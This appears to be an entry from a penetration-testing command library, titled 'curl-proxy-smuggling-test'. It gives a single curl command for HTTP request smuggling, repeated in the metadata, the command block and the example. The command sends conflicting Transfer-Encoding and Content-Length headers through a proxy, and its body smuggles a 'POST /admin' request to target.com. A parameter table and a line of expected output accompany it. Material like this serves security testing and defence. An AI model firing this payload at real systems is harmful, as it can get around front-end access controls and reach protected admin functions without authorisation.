---
data: >-
  curl -v --proxy http://test-proxy:8080 -H "Transfer-Encoding: chunked" -H
  "Content-Length: 50" -X POST -d "0\r\n\r\nPOST /admin HTTP/1.1\r\nHost:
  target.com\r\n\r\n" http://target.com/public
tags:
  - http-smuggling
  - proxy
type: command
executor: bash
platforms:
  - Linux
  - Windows
id: 56abb9ac-ea13-4cdb-a067-dbd76f57b1a0
created_at: '2025-12-13T09:01:21.757Z'
updated_at: '2025-12-13T09:01:21.757Z'
verified: false
validated: true
submitted: true
---
# curl-proxy-smuggling-test

## Command

```bash
curl -v --proxy http://test-proxy:8080 -H "Transfer-Encoding: chunked" -H "Content-Length: 50" -X POST -d "0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" http://target.com/public
```

## Description

Sends a request through a proxy with conflicting headers to demonstrate smuggling.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output | Yes |
| `--proxy http://test-proxy:8080` | Use specified proxy | Yes |
| `-H "Transfer-Encoding: chunked"` | Set Transfer-Encoding header | Yes |
| `-H "Content-Length: 50"` | Set Content-Length header | Yes |
| `-X POST` | Specify POST method | Yes |
| `-d "0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"` | Data payload with smuggled POST request | Yes |

## Examples

### Basic Usage

```bash
curl -v --proxy http://test-proxy:8080 -H "Transfer-Encoding: chunked" -H "Content-Length: 50" -X POST -d "0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" http://target.com/public
```

## Expected Output

Request sent through proxy, potentially smuggling the inner POST request.

## Related

- [[procedures/Test-Smuggling-with-Proxy-Setup]]
